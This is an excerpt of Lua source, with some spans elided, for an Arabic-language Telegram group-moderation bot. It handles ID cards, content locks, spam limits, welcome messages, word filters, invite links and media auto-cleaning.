local new_id = new_id:gsub('#msgs',(user_msgs or 'ماكو'))
local new_id = new_id:gsub('#msgday',(msgsday or 'ماكو'))
local new_id = new_id:gsub('#id',(msg.sender_user_id_ or 'ماكو'))
local new_id = new_id:gsub('#auto',(formsgs(msguser) or 'ماكو'))
local new_id = new_id:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'ماكو'))
local new_id = new_id:gsub('#Description',(Description or 'ماكو'))
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, ALS.photos_[0].sizes_[1].photo_.persistent_id_,new_id,msg.id_,msg.id_.."")
end
else
if DevALS:get(AFS.."ALS:AllIds:Text") then
newallid = DevALS:get(AFS.."ALS:AllIds:Text")
newallid = newallid:gsub('#username',(username or 'ماكو'))
newallid = newallid:gsub('#CustomTitle',(CustomTitle or 'ماكو'))
newallid = newallid:gsub('#bio',(GetBio(msg.sender_user_id_) or 'ماكو'))
newallid = newallid:gsub('#photos',(ALS.total_count_ or 'ماكو')) 
newallid = newallid:gsub('#game',(user_nkt or 'ماكو'))
newallid = newallid:gsub('#edit',(edit_msg or 'ماكو'))
newallid = newallid:gsub('#cont',(cont or 'ماكو'))
newallid = newallid:gsub('#msgs',(user_msgs or 'ماكو'))
newallid = newallid:gsub('#msgday',(msgsday or 'ماكو'))
newallid = newallid:gsub('#id',(msg.sender_user_id_ or 'ماكو'))
newallid = newallid:gsub('#auto',(formsgs(msguser) or 'ماكو'))
newallid = newallid:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'ماكو'))
newallid = newallid:gsub('#Description',(Description or 'ماكو'))
else
...
local new_id = new_id:gsub('#CustomTitle',(CustomTitle or 'ماكو'))
local new_id = new_id:gsub('#bio',(GetBio(msg.sender_user_id_) or 'ماكو'))
local new_id = new_id:gsub('#photos',(ALS.total_count_ or 'ماكو')) 
local new_id = new_id:gsub('#game',(user_nkt or 'ماكو'))
local new_id = new_id:gsub('#edit',(edit_msg or 'ماكو'))
local new_id = new_id:gsub('#cont',(cont or 'ماكو'))
local new_id = new_id:gsub('#msgs',(user_msgs or 'ماكو'))
...
if DevALS:get(AFS.."ALS:AllIds:Text") then
notpicid = DevALS:get(AFS.."ALS:AllIds:Text")
notpicid = notpicid:gsub('#username',(username or 'ماكو'))
notpicid = notpicid:gsub('#CustomTitle',(CustomTitle or 'ماكو'))
notpicid = notpicid:gsub('#bio',(GetBio(msg.sender_user_id_) or 'ماكو'))
notpicid = notpicid:gsub('#photos',(ALS.total_count_ or 'ماكو')) 
notpicid = notpicid:gsub('#game',(user_nkt or 'ماكو'))
notpicid = notpicid:gsub('#edit',(edit_msg or 'ماكو'))
notpicid = notpicid:gsub('#cont',(cont or 'ماكو'))
notpicid = notpicid:gsub('#msgs',(user_msgs or 'ماكو'))
notpicid = notpicid:gsub('#msgday',(msgsday or 'ماكو'))
notpicid = notpicid:gsub('#id',(msg.sender_user_id_ or 'ماكو'))
notpicid = notpicid:gsub('#auto',(formsgs(msguser) or 'ماكو'))
notpicid = notpicid:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'ماكو'))
notpicid = notpicid:gsub('#Description',(Description or 'ماكو'))
else
...
if not DevALS:get(AFS..'ALS:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم قفل التعديل")  
DevALS:set(AFS..'ALS:Lock:EditMsgs'..msg.chat_id_,true)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙التعديل بالفعل مقفل في الكروب', 1, 'md')
end
end
...
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تعديل الميديا بالفعل مقفل في الكروب', 1, 'md')
end
end
if LockText[2] == "الفارسيه" then
if not DevALS:get(AFS..'ALS:Lock:Farsi'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم قفل الفارسيه")  
DevALS:set(AFS..'ALS:Lock:Farsi'..msg.chat_id_,true)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الفارسيه بالفعل مقفله في الكروب', 1, 'md')
end
end
if LockText[2] == "الفشار" then
if DevALS:get(AFS..'ALS:Lock:Fshar'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم قفل الفشار")  
DevALS:del(AFS..'ALS:Lock:Fshar'..msg.chat_id_)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الفشار بالفعل مقفل في الكروب', 1, 'md')
end
end
if LockText[2] == "الطائفيه" then
if DevALS:get(AFS..'ALS:Lock:Taf'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم قفل الطائفيه")  
DevALS:del(AFS..'ALS:Lock:Taf'..msg.chat_id_)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الطائفيه بالفعل مقفله في الكروب', 1, 'md')
end
end
if LockText[2] == "الكفر" then
if DevALS:get(AFS..'ALS:Lock:Kfr'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم قفل الكفر")  
DevALS:del(AFS..'ALS:Lock:Kfr'..msg.chat_id_)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الكفر بالفعل مقفل في الكروب', 1, 'md')
end
end
if LockText[2] == "الفارسيه بالطرد" then
if not DevALS:get(AFS..'ALS:Lock:FarsiBan'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم قفل الفارسيه بالطرد")  
DevALS:set(AFS..'ALS:Lock:FarsiBan'..msg.chat_id_,true)
else
...
DevALS:set(AFS.."ALS:Lock:Bots"..msg.chat_id_,"ked")  
end
if LockText[2] == "التكرار" or LockText[2] == "التكرار بالحذف" then 
DevALS:hset(AFS.."ALS:Spam:Group:User"..msg.chat_id_ ,"Spam:User","del")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم قفل التكرار بالحذف")  
end
if LockText[2] == "التكرار بالطرد" then 
DevALS:hset(AFS.."ALS:Spam:Group:User"..msg.chat_id_ ,"Spam:User","kick")  
...
DevALS:hset(AFS.."ALS:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم قفل التكرار بالتقيد")  
end
if LockText[2] == "التكرار بالكتم" then 
DevALS:hset(AFS.."ALS:Spam:Group:User"..msg.chat_id_ ,"Spam:User","mute")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم قفل التكرار بالكتم")  
end
if BasicConstructor(msg) then
if LockText[2] == "التثبيت" then
if not DevALS:get(AFS..'ALS:Lock:Pin'..msg.chat_id_) then
tdcli_function ({ ID = "GetChannelFull",  channel_id_ = msg.chat_id_:gsub("-100","") }, function(arg,data)  DevALS:set(AFS.."ALS:PinnedMsg"..msg.chat_id_,data.pinned_message_id_)  end,nil)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم قفل التثبيت")  
DevALS:set(AFS..'ALS:Lock:Pin'..msg.chat_id_,true)
DevALS:sadd(AFS.."ALS:Lock:Pinpin",msg.chat_id_) 
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙التثبيت بالفعل مقفل في الكروب', 1, 'md')
end end end
end
end
end
...
DevALS:hset(AFS.."ALS:Spam:Group:User"..msg.chat_id_ ,"Num:Spam" ,TextSpam) 
end
end
if text and (text:match("^ضع زمن التكرار (%d+)$") or text:match("^وضع زمن التكرار (%d+)$")) then  
local TextSpam = text:match("ضع زمن التكرار (%d+)$") or text:match("وضع زمن التكرار (%d+)$")
DevALS:hset(AFS.."ALS:Spam:Group:User"..msg.chat_id_ ,"Num:Spam:Time" ,TextSpam) 
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(AFS..'ALS:Lock:Id:Photo'..msg.chat_id_)
end end
if text and text == 'تعطيل الايدي بالصوره' and ChCheck(msg) then
if DevALS:get(AFS..'ALS:Lock:Id:Photo'..msg.chat_id_) then
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الايدي بالصوره بالتاكيد معطل', 1, 'md')
else
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل الايدي بالصوره'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(AFS..'ALS:Lock:Id:Photo'..msg.chat_id_,true)
end end 
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(AFS..'ALS:Lock:Id'..msg.chat_id_)
end end 
if text and text == 'تعطيل الايدي' and ChCheck(msg) then
if DevALS:get(AFS..'ALS:Lock:Id'..msg.chat_id_) then
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الايدي بالتاكيد معطل ', 1, 'md')
else
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل الايدي بنجاح'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(AFS..'ALS:Lock:Id'..msg.chat_id_,true)
end end
end
--     Source AFS     --
...
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙ارسل رابط الكروب او رابط قناة الكروب', 1, 'md')
DevALS:setex(AFS.."ALS:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_,300,true) 
end
if text == 'انشاء رابط' and ChCheck(msg) or text == 'انشاء الرابط' and ChCheck(msg) then
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if not DevALS:get(AFS.."ALS:Groups:Links"..msg.chat_id_)  then 
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
DevALS:set(AFS.."ALS:Groups:Links"..msg.chat_id_,LinkGroup) 
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(AFS.."ALS:Lock:Welcome"..msg.chat_id_,true)
end
if text and text:match("^تعطيل الترحيب$") and ChCheck(msg) then
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل الترحيب بنجاح'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(AFS.."ALS:Lock:Welcome"..msg.chat_id_)
end
if DevALS:get(AFS..'ALS:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_) then 
if text == 'الغاء' then 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم الغاء حفظ كليشة الترحيب', 1, 'md')
DevALS:del(AFS..'ALS:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevALS:del(AFS..'ALS:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
Welcomes = text:gsub('"',"") Welcomes = text:gsub("'","") Welcomes = text:gsub(",","") Welcomes = text:gsub("*","") Welcomes = text:gsub(";","") Welcomes = text:gsub("`","") Welcomes = text:gsub("{","") Welcomes = text:gsub("}","") 
DevALS:set(AFS..'ALS:Groups:Welcomes'..msg.chat_id_,Welcomes)
...
DevALS:set(AFS..'ALS:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
if text and text:match("^حذف الترحيب$") and ChCheck(msg) or text and text:match("^حذف ترحيب$") and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم حذف الترحيب")  
DevALS:del(AFS..'ALS:Groups:Welcomes'..msg.chat_id_)
end
if text and text:match("^جلب الترحيب$") and ChCheck(msg) or text and text:match("^جلب ترحيب$") and ChCheck(msg) or text and text:match("^الترحيب$") and ChCheck(msg) then
local Welcomes = DevALS:get(AFS..'ALS:Groups:Welcomes'..msg.chat_id_)
if Welcomes then
Dev_ALS(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
else
...
--     Source AFS     --
if DevALS:get(AFS..'ALS:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_) then  
if text == 'الغاء' then 
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم الغاء حفظ الوصف", 1, 'md')
DevALS:del(AFS..'ALS:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevALS:del(AFS..'ALS:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
https.request('https://api.telegram.org/bot'..TokenBot..'/setChatDescription?chat_id='..msg.chat_id_..'&description='..text) 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم تغيير وصف الكروب', 1, 'md')
return false  
end 
if text and text:match("^ضع وصف$") and ChCheck(msg) or text and text:match("^وضع وصف$") and ChCheck(msg) then  
DevALS:set(AFS..'ALS:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_,true)
...
DevALS:set(AFS.."ALS:SetFilters"..msg.sender_user_id_..msg.chat_id_,"add")  
return false  
end    
if DevALS:get(AFS.."ALS:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "add" then
if text == 'الغاء' then 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم الغاء امر المنع', 1, 'md')
DevALS:del(AFS.."ALS:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
return false  
end   
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم منع الكلمه ↫ "..text, 1, 'html')
DevALS:del(AFS.."ALS:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
DevALS:hset(AFS..'ALS:Filters:'..msg.chat_id_, text,'newword')
return false
end
if text and text == "الغاء منع" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then       
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙ارسل لي الكلمه الان", 1, 'md') 
DevALS:set(AFS.."ALS:SetFilters"..msg.sender_user_id_..msg.chat_id_,"del")  
return false  
end    
if DevALS:get(AFS.."ALS:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "del" then   
if text == 'الغاء' then 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم الغاء امر الغاء المنع', 1, 'md')
DevALS:del(AFS.."ALS:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
return false  
end   
if not DevALS:hget(AFS..'ALS:Filters:'..msg.chat_id_, text) then  
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙الكلمه ↫ "..text.." غير ممنوعه", 1, 'html')
DevALS:del(AFS.."ALS:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
else
DevALS:hdel(AFS..'ALS:Filters:'..msg.chat_id_, text)
...
local gps = DevALS:scard(AFS.."ALS:Groups") local users = DevALS:scard(AFS.."ALS:Users") 
...
local users = DevALS:scard(AFS.."ALS:Users")
...
local gps = DevALS:scard(AFS.."ALS:Groups")
...
DevALS:setex(AFS..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
end 
end
...
local pv = DevALS:smembers(AFS.."ALS:Users")
local sendok = 0
for i = 1, #pv do
...
DevALS:srem(AFS.."ALS:Users",pv[i])
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙*ماكو مشتركين وهميين*', 1, 'md')
else
local ok = #pv - sendok
...
local group = DevALS:smembers(AFS.."ALS:Groups")
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
DevALS:srem(AFS.."ALS:Groups",group[i]) 
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = group[i], user_id_ = AFS, status_ = { ID = "ChatMemberStatusLeft" }, }, dl_cb, nil)
w = w + 1
end
...
Dev_ALS(msg.chat_id_, msg.id_, 1,'☆︙عدد الكروبات الان ↫ { '..#group..' }'..AFSgp1..AFSgp2..'\n☆︙العدد الحقيقي الان  ↫ ( '..AFSgp3..' ) \n ', 1, 'md')
end end
end,nil)
end
return false
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(AFS..'ALS:Lock:CleanNum'..msg.chat_id_,true)  
end
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(AFS..'ALS:Lock:CleanNum'..msg.chat_id_) 
end
...
DevALS:set(AFS..'ALS:CleanNum'..msg.chat_id_,Num) 
end end 
if msg and DevALS:get(AFS..'ALS:Lock:CleanNum'..msg.chat_id_) then
if DevALS:get(AFS..'ALS:CleanNum'..msg.chat_id_) then CleanNum = DevALS:get(AFS..'ALS:CleanNum'..msg.chat_id_) else CleanNum = 200 end
if DevALS:scard(AFS.."ALS:cleanernum"..msg.chat_id_) >= tonumber(CleanNum) then 
local List = DevALS:smembers(AFS.."ALS:cleanernum"..msg.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
...
DevALS:del(AFS.."ALS:cleanernum"..msg.chat_id_)
end 
end
if CleanerNum(msg) then
if DevALS:get(AFS..'ALS:Lock:CleanNum'..msg.chat_id_) then 
if text == "التلقائي" and ChCheck(msg) or text == "عدد التلقائي" and ChCheck(msg) then 
local M = DevALS:scard(AFS.."ALS:cleanernum"..msg.chat_id_)
if M ~= 0 then
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙عدد الميديا ↫ "..M.."\n☆︙الحذف التلقائي ↫ "..(DevALS:get(AFS..'ALS:CleanNum'..msg.chat_id_) or 200), 1, 'md') 
else
...
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل امسح بنجاح'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(AFS..'ALS:Lock:Clean'..msg.chat_id_,true)  
end
if text == "تعطيل امسح" and Constructor(msg) then
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل امسح بنجاح'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(AFS..'ALS:Lock:Clean'..msg.chat_id_) 
end
if Cleaner(msg) then
if DevALS:get(AFS..'ALS:Lock:Clean'..msg.chat_id_) then 
if text == "الميديا" and ChCheck(msg) or text == "عدد الميديا" and ChCheck(msg) then 
local M = DevALS:scard(AFS.."ALS:cleaner"..msg.chat_id_)
if M ~= 0 then
...
DevALS:del(AFS.."ALS:cleaner"..msg.chat_id_)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙لاتوجد ميديا هنا", 1, 'md') 
end end 
end
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(AFS..'ALS:Lock:CleanMusic'..msg.chat_id_,true)  
end
if text == "تعطيل مسح الاغاني" and Constructor(msg) then
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل مسح الاغاني بنجاح'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(AFS..'ALS:Lock:CleanMusic'..msg.chat_id_) 
end
if CleanerMusic(msg) then
if DevALS:get(AFS..'ALS:Lock:CleanMusic'..msg.chat_id_) then 
if text == "الاغاني" and ChCheck(msg) or text == "عدد الاغاني" and ChCheck(msg) then 
local M = DevALS:scard(AFS.."ALS:cleanermusic"..msg.chat_id_)
if M ~= 0 then
...
local List = DevALS:smembers(AFS.."ALS:cleanermusic"..msg.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
...
DevALS:del(AFS.."ALS:cleanermusic"..msg.chat_id_)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙لاتوجد اغاني هنا", 1, 'md') 
end end end end
--     Source AFS     --
...
if DevALS:get(AFS..'ALS:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم فتح التعديل")  
DevALS:del(AFS..'ALS:Lock:EditMsgs'..msg.chat_id_)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙التعديل بالفعل مفتوح في الكروب', 1, 'md')
end
end
if ALSConstructor(msg) then
...
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تعديل الميديا بالفعل مفتوح في الكروب', 1, 'md')
end
end
end
if UnLockText[2] == "الفارسيه" then
if DevALS:get(AFS..'ALS:Lock:Farsi'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم فتح الفارسيه")  
DevALS:del(AFS..'ALS:Lock:Farsi'..msg.chat_id_)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الفارسيه بالفعل مفتوحه في الكروب', 1, 'md')
end
end
if UnLockText[2] == "الفشار" then
if not DevALS:get(AFS..'ALS:Lock:Fshar'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم فتح الفشار")  
DevALS:set(AFS..'ALS:Lock:Fshar'..msg.chat_id_,true)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الفشار بالفعل مفتوح في الكروب', 1, 'md')
end
end
if UnLockText[2] == "الطائفيه" then
if not DevALS:get(AFS..'ALS:Lock:Taf'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم فتح الطائفيه")  
DevALS:set(AFS..'ALS:Lock:Taf'..msg.chat_id_,true)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الطائفيه بالفعل مفتوحه في الكروب', 1, 'md')
end
end
if UnLockText[2] == "الكفر" then
if not DevALS:get(AFS..'ALS:Lock:Kfr'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم فتح الكفر")  
DevALS:set(AFS..'ALS:Lock:Kfr'..msg.chat_id_,true)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الكفر بالفعل مفتوح في الكروب', 1, 'md')
end
end
if UnLockText[2] == "الفارسيه بالطرد" then
if DevALS:get(AFS..'ALS:Lock:FarsiBan'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم فتح الفارسيه بالطرد")  
DevALS:del(AFS..'ALS:Lock:FarsiBan'..msg.chat_id_)
else
...
DevALS:del(AFS.."ALS:Lock:Bots"..msg.chat_id_)  
end end
if UnLockText[2] == "التكرار" then 
DevALS:hdel(AFS.."ALS:Spam:Group:User"..msg.chat_id_ ,"Spam:User")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم فتح التكرار")  
end
if BasicConstructor(msg) then
if UnLockText[2] == "التثبيت" then
if DevALS:get(AFS..'ALS:Lock:Pin'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم فتح التثبيت")  
DevALS:del(AFS..'ALS:Lock:Pin'..msg.chat_id_)
DevALS:srem(AFS.."ALS:Lock:Pinpin",msg.chat_id_)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙التثبيت بالفعل مفتوح في الكروب', 1, 'md')
end end end
end
end
--     Source AFS     --
...
if not DevALS:get(AFS..'ALS:Lock:Text'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم قفل الدردشه")  
DevALS:set(AFS..'ALS:Lock:Text'..msg.chat_id_,true)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الدردشه بالفعل مقفله في الكروب', 1, 'md')
end
end
if LockText[2] == "الاونلاين" then
if not DevALS:get(AFS..'ALS:Lock:Inline'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم قفل الاونلاين")  
DevALS:set(AFS..'ALS:Lock:Inline'..msg.chat_id_,true)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الاونلاين بالفعل مقفل في الكروب', 1, 'md')
end
end
if LockText[2] == "الصور" then
if not DevALS:get(AFS..'ALS:Lock:Photo'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم قفل الصور")  
DevALS:set(AFS..'ALS:Lock:Photo'..msg.chat_id_,true)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الصور بالفعل مقفله في الكروب', 1, 'md')
end
end
if LockText[2] == "الكلايش" then
if not DevALS:get(AFS..'ALS:Lock:Spam'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم قفل الكلايش")  
DevALS:set(AFS..'ALS:Lock:Spam'..msg.chat_id_,true)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الكلايش بالفعل مقفله في الكروب', 1, 'md')
end
end
if LockText[2] == "الدخول" then
if not DevALS:get(AFS..'ALS:Lock:Join'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم قفل الدخول")  
DevALS:set(AFS..'ALS:Lock:Join'..msg.chat_id_,true)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الدخول بالفعل مقفل في الكروب', 1, 'md')
end
end
if LockText[2] == "الفيديو" then
if not DevALS:get(AFS..'ALS:Lock:Videos'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم قفل الفيديو")  
DevALS:set(AFS..'ALS:Lock:Videos'..msg.chat_id_,true)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الفيديو بالفعل مقفل في الكروب', 1, 'md')
end
end
if LockText[2] == "المتحركه" then
if not DevALS:get(AFS..'ALS:Lock:Gifs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم قفل المتحركه")  
DevALS:set(AFS..'ALS:Lock:Gifs'..msg.chat_id_,true)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙المتحركه بالفعل مقفله في الكروب', 1, 'md')
end
end
if LockText[2] == "الاغاني" then
if not DevALS:get(AFS..'ALS:Lock:Music'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم قفل الاغاني")  
DevALS:set(AFS..'ALS:Lock:Music'..msg.chat_id_,true)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الاغاني بالفعل مقفله في الكروب', 1, 'md')
end
end
if LockText[2] == "الصوت" then
if not DevALS:get(AFS..'ALS:Lock:Voice'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم قفل الصوت")  
DevALS:set(AFS..'ALS:Lock:Voice'..msg.chat_id_,true)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الصوت بالفعل مقفل في الكروب', 1, 'md')
end
end
if LockText[2] == "الروابط" then
if not DevALS:get(AFS..'ALS:Lock:Links'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم قفل الروابط")  
DevALS:set(AFS..'ALS:Lock:Links'..msg.chat_id_,true)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الروابط بالفعل مقفله في الكروب', 1, 'md')
end
end
if LockText[2] == "المواقع" then
if not DevALS:get(AFS..'ALS:Lock:Location'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم قفل المواقع")  
DevALS:set(AFS..'ALS:Lock:Location'..msg.chat_id_,true)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙المواقع بالفعل مقفله في الكروب', 1, 'md')
end
end
if LockText[2] == "المعرف" or LockText[2] == "المعرفات" then
if not DevALS:get(AFS..'ALS:Lock:Tags'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم قفل المعرفات")  
DevALS:set(AFS..'ALS:Lock:Tags'..msg.chat_id_,true)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙المعرفات بالفعل مقفله في الكروب', 1, 'md')
end
end
if LockText[2] == "الملفات" then
if not DevALS:get(AFS..'ALS:Lock:Document'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم قفل الملفات")  
DevALS:set(AFS..'ALS:Lock:Document'..msg.chat_id_,true)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الملفات بالفعل مقفله في الكروب', 1, 'md')
end
end
if LockText[2] == "الهاشتاك" or LockText[2] == "التاك" then
if not DevALS:get(AFS..'ALS:Lock:Hashtak'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم قفل الهاشتاك")  
DevALS:set(AFS..'ALS:Lock:Hashtak'..msg.chat_id_,true)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الهاشتاك بالفعل مقفل في الكروب', 1, 'md')
end
end
if LockText[2] == "الجهات" then
if not DevALS:get(AFS..'ALS:Lock:Contact'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم قفل الجهات")  
DevALS:set(AFS..'ALS:Lock:Contact'..msg.chat_id_,true)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '️☆︙الجهات بالفعل مقفله في الكروب', 1, 'md')
end
end
if LockText[2] == "الشبكات" then
if not DevALS:get(AFS..'ALS:Lock:WebLinks'..msg.chat_id_) then
